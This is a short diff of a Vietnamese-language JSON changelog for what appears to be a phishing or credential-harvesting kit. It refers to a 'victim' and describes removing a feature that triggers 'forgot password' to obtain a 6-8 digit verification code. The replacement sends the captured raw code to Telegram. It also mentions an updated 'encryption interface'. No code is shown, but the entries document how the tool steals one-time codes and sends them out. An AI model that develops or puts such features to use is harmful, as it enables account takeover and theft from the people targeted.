@@ -1,7 +1,7 @@
 [
     {
-        "title": "Chức năng lấy mã 6-8 khi nhập sai mật khẩu:",
-        "description": "Tự nhấn vào phần quên mật khẩu khi victim nhập sai."
+        "title": "Loại bỏ chức năng tự lấy code 6 - 8 khi sai pass:",
+        "description": "Thay thế bằng cách gửi code raw về Telegram"
     },
     {
         "title": "Cập nhật giao diện mã hóa:",
